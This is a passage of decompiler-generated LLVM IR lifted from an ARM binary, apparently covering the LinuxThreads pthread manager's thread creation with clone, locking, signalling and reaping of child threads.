  %v1_b578 = load i32, i32* @r8, align 4
  %v2_b578 = add i32 %v1_b578, 28
  %v3_b578 = inttoptr i32 %v2_b578 to i32*
  store i32 %v0_b578, i32* %v3_b578, align 4
  %v0_b57c = load i32, i32* @r8, align 4
  %v1_b57c = load i32, i32* %r0.global-to-local, align 4
  %v2_b57c = add i32 %v1_b57c, 8
  %v3_b57c = inttoptr i32 %v2_b57c to i32*
  store i32 %v0_b57c, i32* %v3_b57c, align 4
  br i1 %v2_b550, label %dec_label_pc_b5e4, label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b4d8
  %v0_b584 = load i32, i32* @sl, align 4
  %v1_b584 = inttoptr i32 %v0_b584 to i32*
  %v2_b584 = load i32, i32* %v1_b584, align 4
  store i32 %v2_b584, i32* %r3.global-to-local, align 4
  %v1_b588 = trunc i32 %v2_b584 to i8
  %v2_b588 = load i32, i32* @r8, align 4
  %v3_b588 = add i32 %v2_b588, 45
  %v4_b588 = inttoptr i32 %v3_b588 to i8*
  store i8 %v1_b588, i8* %v4_b588, align 1
  %v0_b58c = load i32, i32* @sl, align 4
  %v1_b58c = add i32 %v0_b58c, 24
  %v2_b58c = inttoptr i32 %v1_b58c to i32*
  %v3_b58c = load i32, i32* %v2_b58c, align 4
  store i32 %v3_b58c, i32* %r3.global-to-local, align 4
  %v1_b590 = load i32, i32* @r8, align 4
  %v2_b590 = add i32 %v1_b590, 392
  %v3_b590 = inttoptr i32 %v2_b590 to i32*
  store i32 %v3_b58c, i32* %v3_b590, align 4
  %v0_b594 = load i32, i32* @sl, align 4
  %v1_b594 = add i32 %v0_b594, 12
  %v2_b594 = inttoptr i32 %v1_b594 to i32*
  %v3_b594 = load i32, i32* %v2_b594, align 4
  store i32 %v3_b594, i32* %r3.global-to-local, align 4
  %v1_b598 = load i32, i32* %r1.global-to-local, align 4
  %v9_b598 = icmp eq i32 %v3_b594, %v1_b598
  store i1 %v9_b598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b598, label %dec_label_pc_b5c4, label %dec_label_pc_b5a0

dec_label_pc_b5a0:                                ; preds = %dec_label_pc_b584
  %v7_b5a0 = icmp eq i32 %v3_b594, 1
  store i1 %v7_b5a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b5a0, label %dec_label_pc_b5a8, label %dec_label_pc_b5dc

dec_label_pc_b5a8:                                ; preds = %dec_label_pc_b5a0
  %v1_b5a8 = add i32 %v0_b594, 4
  %v2_b5a8 = inttoptr i32 %v1_b5a8 to i32*
  %v3_b5a8 = load i32, i32* %v2_b5a8, align 4
  store i32 %v3_b5a8, i32* %r3.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r8, align 4
  %v1_b5ac = add i32 %v0_b5ac, 232
  store i32 %v1_b5ac, i32* @r0, align 4
  %v2_b5b0 = add i32 %v0_b5ac, 228
  %v3_b5b0 = inttoptr i32 %v2_b5b0 to i32*
  store i32 %v3_b5a8, i32* %v3_b5b0, align 4
  %v0_b5b4 = load i32, i32* @sl, align 4
  %v1_b5b4 = add i32 %v0_b5b4, 8
  store i32 %v1_b5b4, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_b5bc = call i32 @memcpy()
  store i32 %v0_b5bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5dc

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b584
  store i32 %v3_b348, i32* %r0.global-to-local, align 4
  %v0_b5c8 = call i32 @sched_getscheduler()
  %v0_b5cc = load i32, i32* @r8, align 4
  %v1_b5cc = add i32 %v0_b5cc, 232
  store i32 %v1_b5cc, i32* %r1.global-to-local, align 4
  %v2_b5d0 = add i32 %v0_b5cc, 228
  %v3_b5d0 = inttoptr i32 %v2_b5d0 to i32*
  store i32 %v0_b5c8, i32* %v3_b5d0, align 4
  store i32 %v3_b348, i32* %r0.global-to-local, align 4
  %v0_b5d8 = call i32 @sched_getparam()
  store i32 %v0_b5d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5a0, %dec_label_pc_b5a8, %dec_label_pc_b5c4
  %v0_b5dc = load i32, i32* @r8, align 4
  %v1_b5dc = add i32 %v0_b5dc, 232
  %v2_b5dc = inttoptr i32 %v1_b5dc to i32*
  %v3_b5dc = load i32, i32* %v2_b5dc, align 4
  store i32 %v3_b5dc, i32* %r3.global-to-local, align 4
  %v2_b5e0 = add i32 %v0_b5dc, 24
  %v3_b5e0 = inttoptr i32 %v2_b5e0 to i32*
  store i32 %v3_b5dc, i32* %v3_b5e0, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b4d8, %dec_label_pc_b5dc
  store i32 %tmp46, i32* %r2.global-to-local, align 4
  %v1_b5ec = load i32, i32* @r8, align 4
  %v2_b5ec = add i32 %v1_b5ec, 92
  %v3_b5ec = inttoptr i32 %v2_b5ec to i32*
  store i32 %tmp55, i32* %v3_b5ec, align 4
  %v0_b5f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b5f0 = load i32, i32* @r8, align 4
  %v2_b5f0 = add i32 %v1_b5f0, 96
  %v3_b5f0 = inttoptr i32 %v2_b5f0 to i32*
  store i32 %v0_b5f0, i32* %v3_b5f0, align 4
  store i32 %v2_b5f4, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_b5fc = load i32, i32* @r8, align 4
  %v1_b5fc = add i32 %v0_b5fc, 100
  store i32 %v1_b5fc, i32* @r0, align 4
  %v0_b600 = call i32 @memcpy()
  store i32 %v0_b600, i32* %r0.global-to-local, align 4
  %v0_b604 = load i32, i32* @r8, align 4
  %v1_b604 = add i32 %v0_b604, 24
  %v2_b604 = inttoptr i32 %v1_b604 to i32*
  %v3_b604 = load i32, i32* %v2_b604, align 4
  store i32 %v3_b604, i32* %r0.global-to-local, align 4
  %v1_b608 = call i32 @__pthread_manager_adjust_prio(i32 %v3_b604)
  store i32 %v1_b608, i32* %r0.global-to-local, align 4
  %v2_b610 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_b610, i32* %r2.global-to-local, align 4
  %v1_b618 = load i32, i32* @r8, align 4
  %v2_b618 = inttoptr i32 %v1_b618 to i32*
  store i32 %v2_b610, i32* %v2_b618, align 4
  store i32 %v3_b34c, i32* %ip.global-to-local, align 4
  %v2_b620 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_b620, i32* %r3.global-to-local, align 4
  %v2_b624 = icmp eq i32 %v3_b34c, 0
  store i1 %v2_b624, i1* %cpsr_z.global-to-local, align 1
  %v0_b628 = load i32, i32* %r2.global-to-local, align 4
  %v1_b628 = load i32, i32* @r8, align 4
  %v2_b628 = add i32 %v1_b628, 4
  %v3_b628 = inttoptr i32 %v2_b628 to i32*
  store i32 %v0_b628, i32* %v3_b628, align 4
  %v0_b62c = load i32, i32* @r8, align 4
  %v1_b62c = load i32, i32* %r2.global-to-local, align 4
  %v2_b62c = inttoptr i32 %v1_b62c to i32*
  store i32 %v0_b62c, i32* %v2_b62c, align 4
  %v0_b630 = load i32, i32* @r8, align 4
  store i32 %v0_b630, i32* @global_var_2b484.197, align 4
  br i1 %v2_b624, label %dec_label_pc_b6b4, label %dec_label_pc_b638

dec_label_pc_b638:                                ; preds = %dec_label_pc_b5e4
  store i32 %v3_b328, i32* %r1.global-to-local, align 4
  %v2_b640 = load i32, i32* @global_var_3023c.215, align 4
  store i32 %v2_b640, i32* %r3.global-to-local, align 4
  %v1_b644 = add i32 %v3_b328, 416
  %v2_b644 = inttoptr i32 %v1_b644 to i32*
  %v3_b644 = load i32, i32* %v2_b644, align 4
  store i32 %v3_b644, i32* %r2.global-to-local, align 4
  %v2_b648 = or i32 %v3_b644, %v2_b640
  store i32 %v2_b648, i32* %r3.global-to-local, align 4
  %v1_b64c = and i32 %v2_b648, 128
  %v2_b64c = icmp eq i32 %v1_b64c, 0
  store i1 %v2_b64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b64c, label %dec_label_pc_b6b4, label %dec_label_pc_b654

dec_label_pc_b654:                                ; preds = %dec_label_pc_b638
  %v1_b654 = add i32 %v0_b630, 28
  %v2_b654 = inttoptr i32 %v1_b654 to i32*
  %v3_b654 = load i32, i32* %v2_b654, align 4
  store i32 %v3_b654, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b65c = call i32 @__pthread_lock(i32 %v3_b654, i32 0)
  %v2_b664 = load i32, i32* @global_var_2b48c.226, align 4
  store i32 ptrtoint (i32* @global_var_af9c.249 to i32), i32* %r0.global-to-local, align 4
  %v1_b66c = or i32 %v2_b664, 3840
  store i32 %v1_b66c, i32* @r2, align 4
  %v0_b670 = load i32, i32* @r8, align 4
  store i32 %v0_b670, i32* %r1.global-to-local, align 4
  store i32 %v0_b670, i32* @r3, align 4
  %v2_b678 = call i32 @clone(i32 ptrtoint (i32* @global_var_af9c.249 to i32), i32 %v0_b670)
  store i32 %v2_b678, i32* @r0, align 4
  %v7_b67c = icmp eq i32 %v2_b678, -1
  store i1 %v7_b67c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b678, i32* @r4, align 4
  br i1 %v7_b67c, label %dec_label_pc_b6ac, label %dec_label_pc_b688

dec_label_pc_b688:                                ; preds = %dec_label_pc_b654
  %v1_b68c = load i32, i32* @r8, align 4
  %v2_b68c = add i32 %v1_b68c, 424
  %v3_b68c = inttoptr i32 %v2_b68c to i32*
  store i32 8, i32* %v3_b68c, align 4
  store i32 ptrtoint (i32* @global_var_30244.217 to i32), i32* %r3.global-to-local, align 4
  %v1_b694 = load i32, i32* @r8, align 4
  %v2_b694 = add i32 %v1_b694, 20
  %v3_b694 = inttoptr i32 %v2_b694 to i32*
  store i32 %v2_b678, i32* %v3_b694, align 4
  %v0_b698 = load i32, i32* @r8, align 4
  %v2_b698 = add i32 %v0_b698, 428
  %v3_b698 = inttoptr i32 %v2_b698 to i32*
  store i32 %v0_b698, i32* %v3_b698, align 4
  %v0_b69c = load i32, i32* @r8, align 4
  %v1_b69c = load i32, i32* %r3.global-to-local, align 4
  %v2_b69c = inttoptr i32 %v1_b69c to i32*
  store i32 %v0_b69c, i32* %v2_b69c, align 4
  %v0_b6a0 = call i32 @__linuxthreads_create_event()
  store i32 %v0_b6a0, i32* %r0.global-to-local, align 4
  %v0_b6a4 = load i32, i32* @r8, align 4
  %v1_b6a4 = add i32 %v0_b6a4, 28
  %v2_b6a4 = inttoptr i32 %v1_b6a4 to i32*
  %v3_b6a4 = load i32, i32* %v2_b6a4, align 4
  store i32 %v3_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__pthread_unlock(i32 %v3_b6a4)
  store i32 %v1_b6a8, i32* %r0.global-to-local, align 4
  %v0_b6ac.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_b6ac

dec_label_pc_b6ac:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b688
  %v0_b6d4.pr = phi i32 [ %v2_b678, %dec_label_pc_b654 ], [ %v0_b6ac.pr, %dec_label_pc_b688 ]
  %v2_b6ac = icmp eq i32 %v0_b6d4.pr, 0
  store i1 %v2_b6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6ac, label %dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge, label %dec_label_pc_b6d4

dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge:    ; preds = %dec_label_pc_b6ac
  %v0_b6c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b6b4

dec_label_pc_b6b4:                                ; preds = %dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge, %dec_label_pc_b638, %dec_label_pc_b5e4
  %v0_b6c4 = phi i32 [ %v0_b6c4.pre, %dec_label_pc_b6ac.dec_label_pc_b6b4_crit_edge ], [ %v0_b630, %dec_label_pc_b638 ], [ %v0_b630, %dec_label_pc_b5e4 ]
  %v2_b6b8 = load i32, i32* @global_var_2b48c.226, align 4
  store i32 ptrtoint (i32* @global_var_aec0.252 to i32), i32* %r0.global-to-local, align 4
  %v1_b6c0 = or i32 %v2_b6b8, 3840
  store i32 %v1_b6c0, i32* @r2, align 4
  store i32 %v0_b6c4, i32* %r1.global-to-local, align 4
  store i32 %v0_b6c4, i32* @r3, align 4
  %v2_b6cc = call i32 @clone(i32 ptrtoint (i32* @global_var_aec0.252 to i32), i32 %v0_b6c4)
  store i32 %v2_b6cc, i32* %r0.global-to-local, align 4
  store i32 %v2_b6cc, i32* @r4, align 4
  br label %dec_label_pc_b6d4

dec_label_pc_b6d4:                                ; preds = %dec_label_pc_b6ac, %dec_label_pc_b6b4
  %v0_b770 = phi i32 [ %v2_b6cc, %dec_label_pc_b6b4 ], [ %v0_b6d4.pr, %dec_label_pc_b6ac ]
  %v3_b6d4 = icmp eq i32 %v0_b770, -1
  %v8_b6d4 = icmp eq i32 %v0_b770, -1
  store i1 %v8_b6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b6d4, label %dec_label_pc_b6dc, label %dec_label_pc_b768

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6d4
  %v0_b6dc = load i32, i32* @r8, align 4
  %v1_b6dc = inttoptr i32 %v0_b6dc to i32*
  %v2_b6dc = load i32, i32* %v1_b6dc, align 4
  store i32 %v2_b6dc, i32* %r3.global-to-local, align 4
  %v1_b6e0 = add i32 %v0_b6dc, 4
  %v2_b6e0 = inttoptr i32 %v1_b6e0 to i32*
  %v3_b6e0 = load i32, i32* %v2_b6e0, align 4
  store i32 %v3_b6e0, i32* %r2.global-to-local, align 4
  %v2_b6e4 = add i32 %v2_b6dc, 4
  %v3_b6e4 = inttoptr i32 %v2_b6e4 to i32*
  store i32 %v3_b6e0, i32* %v3_b6e4, align 4
  %v0_b6e8 = load i32, i32* @r8, align 4
  %v1_b6e8 = add i32 %v0_b6e8, 4
  %v2_b6e8 = inttoptr i32 %v1_b6e8 to i32*
  %v3_b6e8 = load i32, i32* %v2_b6e8, align 4
  store i32 %v3_b6e8, i32* %r2.global-to-local, align 4
  %v0_b6ec = load i32, i32* @sl, align 4
  %v2_b6ec = icmp eq i32 %v0_b6ec, 0
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  %v0_b6f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_b6f0 = inttoptr i32 %v3_b6e8 to i32*
  store i32 %v0_b6f0, i32* %v2_b6f0, align 4
  br i1 %v2_b6ec, label %dec_label_pc_b704, label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b6dc
  %v0_b6f8 = load i32, i32* @sl, align 4
  %v1_b6f8 = add i32 %v0_b6f8, 24
  %v2_b6f8 = inttoptr i32 %v1_b6f8 to i32*
  %v3_b6f8 = load i32, i32* %v2_b6f8, align 4
  store i32 %v3_b6f8, i32* %r3.global-to-local, align 4
  %v2_b6fc = icmp eq i32 %v3_b6f8, 0
  store i1 %v2_b6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6fc, label %dec_label_pc_b704, label %dec_label_pc_b72c

dec_label_pc_b704:                                ; preds = %dec_label_pc_b6f8, %dec_label_pc_b6dc
  %v0_b704 = load i32, i32* @r8, align 4
  %v1_b704 = add i32 %v0_b704, 400
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* %r1.global-to-local, align 4
  %v2_b708 = icmp eq i32 %v3_b704, 0
  store i1 %v2_b708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b708, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_b704
  %v2_b70c = add i32 %v0_b704, 396
  %v3_b70c = inttoptr i32 %v2_b70c to i32*
  %v4_b70c = load i32, i32* %v3_b70c, align 4
  store i32 %v4_b70c, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_b704, %bb65
  %v1_b710 = xor i1 %v2_b708, true
  call void @__pseudo_cond_branch(i1 %v1_b710, i32 ptrtoint (i32* @global_var_103d0.211 to i32))
  store i32 ptrtoint (i32* @global_var_300c8.241 to i32), i32* %r3.global-to-local, align 4
  %v2_b718 = load i32, i32* @global_var_300c8.241, align 4
  %v3_b71c = mul i32 %v2_b718, 4
  store i32 %v3_b71c, i32* %r1.global-to-local, align 4
  %v1_b720 = load i32, i32* @r8, align 4
  %v2_b720 = sub i32 480, %v3_b71c
  %v1_b724 = add i32 %v2_b720, %v1_b720
  store i32 %v1_b724, i32* %r0.global-to-local, align 4
  %v0_b728 = call i32 @munmap()
  store i32 %v0_b728, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b6f8, %bb66
  store i32 ptrtoint (i32* @global_var_2b0a0.209 to i32), i32* %r0.global-to-local, align 4
  store i32 %v1_b3a0, i32* %ip.global-to-local, align 4
  %v2_b734 = load i32, i32* @global_var_2b0a0.209, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v5_b3a0, i32* %r3.global-to-local, align 4
  %v1_b744 = add i32 %v2_b734, -1
  store i32 %v1_b744, i32* %r2.global-to-local, align 4
  %v2_b748 = add i32 %v4_b3a0, add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 12)
  %v3_b748 = inttoptr i32 %v2_b748 to i32*
  store i32 0, i32* %v3_b748, align 4
  %v0_b74c = load i32, i32* %r2.global-to-local, align 4
  %v1_b74c = load i32, i32* %r0.global-to-local, align 4
  %v2_b74c = inttoptr i32 %v1_b74c to i32*
  store i32 %v0_b74c, i32* %v2_b74c, align 4
  %v0_b750 = load i32, i32* %r1.global-to-local, align 4
  %v1_b750 = load i32, i32* %r3.global-to-local, align 4
  %v2_b750 = add i32 %v1_b750, 8
  %v3_b750 = inttoptr i32 %v2_b750 to i32*
  store i32 %v0_b750, i32* %v3_b750, align 4
  %v0_b754 = call i32 @__errno_location()
  store i32 %v0_b754, i32* %r0.global-to-local, align 4
  %v1_b758 = inttoptr i32 %v0_b754 to i32*
  %v2_b758 = load i32, i32* %v1_b758, align 4
  store i32 %v2_b758, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b760:                                ; preds = %dec_label_pc_b4c8
  store i32 11, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b768:                                ; preds = %dec_label_pc_b6d4
  store i32 %v2_b500, i32* %r2.global-to-local, align 4
  store i32 %v3_b328, i32* %r1.global-to-local, align 4
  %v1_b770 = load i32, i32* @r8, align 4
  %v2_b770 = add i32 %v1_b770, 20
  %v3_b770 = inttoptr i32 %v2_b770 to i32*
  store i32 %v0_b770, i32* %v3_b770, align 4
  %v0_b774 = load i32, i32* %r2.global-to-local, align 4
  %v1_b774 = load i32, i32* %r1.global-to-local, align 4
  %v2_b774 = add i32 %v1_b774, 48
  %v3_b774 = inttoptr i32 %v2_b774 to i32*
  store i32 %v0_b774, i32* %v3_b774, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %bb63, %dec_label_pc_b760, %dec_label_pc_b72c, %dec_label_pc_b768
  %v0_b780 = phi i32 [ 1, %bb63 ], [ 11, %dec_label_pc_b760 ], [ %v2_b758, %dec_label_pc_b72c ], [ 0, %dec_label_pc_b768 ]
  store i32 %v3_b328, i32* %r3.global-to-local, align 4
  %v2_b780 = add i32 %v3_b328, 52
  %v3_b780 = inttoptr i32 %v2_b780 to i32*
  store i32 %v0_b780, i32* %v3_b780, align 4
  %v3_b784 = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_b784, i32* @r0, align 4
  br label %dec_label_pc_b890

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b2f0
  store i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32* %r2.global-to-local, align 4
  store i32 %v3_b798, i32* %r3.global-to-local, align 4
  store i32 %v5_b79c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b7a8 = call i32 @__pthread_lock(i32 %v5_b79c, i32 0)
  store i32 %v2_b7a8, i32* %r0.global-to-local, align 4
  %v0_b7ac = load i32, i32* @r5, align 4
  %v1_b7ac = add i32 %v0_b7ac, 8
  %v2_b7ac = inttoptr i32 %v1_b7ac to i32*
  %v3_b7ac = load i32, i32* %v2_b7ac, align 4
  store i32 %v3_b7ac, i32* @r4, align 4
  %v2_b7b0 = icmp eq i32 %v3_b7ac, 0
  store i1 %v2_b7b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b7b0, label %dec_label_pc_b7ec, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b78c
  %v1_b7b8 = add i32 %v3_b7ac, 16
  %v2_b7b8 = inttoptr i32 %v1_b7b8 to i32*
  %v3_b7b8 = load i32, i32* %v2_b7b8, align 4
  store i32 %v3_b7b8, i32* %r3.global-to-local, align 4
  %v1_b7bc = load i32, i32* @r6, align 4
  %v9_b7bc = icmp eq i32 %v3_b7b8, %v1_b7bc
  store i1 %v9_b7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b7bc, label %dec_label_pc_b7c4, label %dec_label_pc_b7ec

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b7b8
  %v1_b7c4 = add i32 %v3_b7ac, 46
  %v2_b7c4 = inttoptr i32 %v1_b7c4 to i8*
  %v3_b7c4 = load i8, i8* %v2_b7c4, align 1
  %v4_b7c4 = zext i8 %v3_b7c4 to i32
  store i32 %v4_b7c4, i32* %r3.global-to-local, align 4
  %v2_b7c8 = icmp eq i8 %v3_b7c4, 0
  store i1 %v2_b7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b7c8, label %.thread5, label %dec_label_pc_b7d8

.thread5:                                         ; preds = %dec_label_pc_b7c4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_b7d0 = add i32 %v3_b7ac, 45
  %v5_b7d0 = inttoptr i32 %v4_b7d0 to i8*
  store i8 1, i8* %v5_b7d0, align 1
  %v0_b7d4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_b7ec.pre = load i32, i32* @r5, align 4
  br i1 %v0_b7d4.pr.pr, label %dec_label_pc_b7ec, label %dec_label_pc_b7d8

dec_label_pc_b7d8:                                ; preds = %.thread5, %dec_label_pc_b7c4
  %v0_b7d8 = phi i32 [ %v0_b7ac, %dec_label_pc_b7c4 ], [ %v0_b7ec.pre, %.thread5 ]
  store i32 %v0_b7d8, i32* %r0.global-to-local, align 4
  %v1_b7dc = call i32 @__pthread_unlock(i32 %v0_b7d8)
  %v0_b7e0 = load i32, i32* @r4, align 4
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  %v1_b7e4 = call i32 @pthread_free(i32 %v0_b7e0)
  store i32 %v1_b7e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b7ec:                                ; preds = %.thread5, %dec_label_pc_b7b8, %dec_label_pc_b78c
  %v0_b7ec = phi i32 [ %v0_b7ac, %dec_label_pc_b7b8 ], [ %v0_b7ac, %dec_label_pc_b78c ], [ %v0_b7ec.pre, %.thread5 ]
  store i32 %v0_b7ec, i32* %r0.global-to-local, align 4
  %v1_b7f0 = call i32 @__pthread_unlock(i32 %v0_b7ec)
  store i32 %v1_b7f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b7f8:                                ; preds = %dec_label_pc_b2f0
  store i32 ptrtoint (i32* @global_var_2be58.254 to i32), i32* %r3.global-to-local, align 4
  %v3_b7fc = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_b7fc, i32* @r4, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_2be58.254, align 4
  %v1_b808 = inttoptr i32 %v3_b7fc to i32*
  %v2_b808 = load i32, i32* %v1_b808, align 4
  store i32 %v2_b808, i32* @r5, align 4
  store i32 %tmp48, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2be5c.256 to i32), i32* %r3.global-to-local, align 4
  store i32 %tmp48, i32* @global_var_2be5c.256, align 4
  %v9_b83020 = icmp eq i32 %v2_b808, %v3_b7fc
  store i1 %v9_b83020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b83020, label %dec_label_pc_b854.preheader, label %dec_label_pc_b81c

dec_label_pc_b81c:                                ; preds = %dec_label_pc_b7f8, %dec_label_pc_b81c
  %v0_b820 = phi i32 [ %v2_b82c, %dec_label_pc_b81c ], [ %v2_b808, %dec_label_pc_b7f8 ]
  store i32 ptrtoint (i32* @global_var_2b48c.226 to i32), i32* %r3.global-to-local, align 4
  %v1_b820 = add i32 %v0_b820, 20
  %v2_b820 = inttoptr i32 %v1_b820 to i32*
  %v3_b820 = load i32, i32* %v2_b820, align 4
  store i32 %v3_b820, i32* %r0.global-to-local, align 4
  %v2_b824 = load i32, i32* @global_var_2b48c.226, align 4
  store i32 %v2_b824, i32* %r1.global-to-local, align 4
  %v0_b828 = call i32 @kill()
  store i32 %v0_b828, i32* %r0.global-to-local, align 4
  %v0_b82c = load i32, i32* @r5, align 4
  %v1_b82c = inttoptr i32 %v0_b82c to i32*
  %v2_b82c = load i32, i32* %v1_b82c, align 4
  store i32 %v2_b82c, i32* @r5, align 4
  %v1_b830 = load i32, i32* @r4, align 4
  %v9_b830 = icmp eq i32 %v2_b82c, %v1_b830
  store i1 %v9_b830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b830, label %dec_label_pc_b854.preheader, label %dec_label_pc_b81c

dec_label_pc_b854.preheader:                      ; preds = %dec_label_pc_b81c, %dec_label_pc_b7f8
  %v1_b854.ph = phi i32 [ %v3_b7fc, %dec_label_pc_b7f8 ], [ %v2_b82c, %dec_label_pc_b81c ]
  %storemerge.in81 = inttoptr i32 %v1_b854.ph to i32*
  %storemerge82 = load i32, i32* %storemerge.in81, align 4
  store i32 %storemerge82, i32* @r4, align 4
  %v9_b85490 = icmp eq i32 %storemerge82, %v1_b854.ph
  store i1 %v9_b85490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b85490, label %dec_label_pc_b85c, label %dec_label_pc_b840

dec_label_pc_b840:                                ; preds = %dec_label_pc_b854.preheader, %dec_label_pc_b840
  %storemerge91 = phi i32 [ %storemerge, %dec_label_pc_b840 ], [ %storemerge82, %dec_label_pc_b854.preheader ]
  %v1_b840 = add i32 %storemerge91, 20
  %v2_b840 = inttoptr i32 %v1_b840 to i32*
  %v3_b840 = load i32, i32* %v2_b840, align 4
  store i32 %v3_b840, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  %v3_b84c = call i32 @waitpid(i32 %v3_b840, i32 0, i32 -2147483648)
  store i32 %v3_b84c, i32* %r0.global-to-local, align 4
  %storemerge.in.in.pre = load i32, i32* @r4, align 4
  %v1_b854.pre = load i32, i32* @r5, align 4
  %storemerge.in = inttoptr i32 %storemerge.in.in.pre to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v9_b854 = icmp eq i32 %storemerge, %v1_b854.pre
  store i1 %v9_b854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b854, label %dec_label_pc_b85c, label %dec_label_pc_b840

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b840, %dec_label_pc_b854.preheader
  %v1_b854.lcssa = phi i32 [ %v1_b854.ph, %dec_label_pc_b854.preheader ], [ %v1_b854.pre, %dec_label_pc_b840 ]
  store i32 %v1_b854.lcssa, i32* @r0, align 4
  %v1_b860 = call i32 @restart(i32 %v1_b854.lcssa)
  br label %dec_label_pc_b864

dec_label_pc_b864:                                ; preds = %dec_label_pc_b2b4, %dec_label_pc_b85c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_b868 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b2f0
  store i32 ptrtoint (i32* @global_var_2bd14.195 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_2bd14.195, align 4
  %v0_b878 = call i32 @pthread_reap_children()
  %v2_b880 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_b880, i32* %r3.global-to-local, align 4
  store i32 %v2_b880, i32* @r0, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b890

dec_label_pc_b890:                                ; preds = %dec_label_pc_b86c, %dec_label_pc_b77c
  %v0_b890 = phi i32 [ %v2_b880, %dec_label_pc_b86c ], [ %v3_b784, %dec_label_pc_b77c ]
  %v1_b890 = call i32 @restart(i32 %v0_b890)
  store i32 %v1_b890, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b898:                                ; preds = %dec_label_pc_b2f0
  store i32 %tmp48, i32* %r0.global-to-local, align 4
  %v1_b89c = call i32 @__new_sem_post(i32 %tmp48)
  store i32 %v1_b89c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b2f0
  %v2_b8a8 = load i32, i32* @global_var_30248.202, align 4
  store i32 %v2_b8a8, i32* %r3.global-to-local, align 4
  %v2_b8ac = icmp eq i32 %v2_b8a8, 0
  store i1 %v2_b8ac, i1* %cpsr_z.global-to-local, align 1
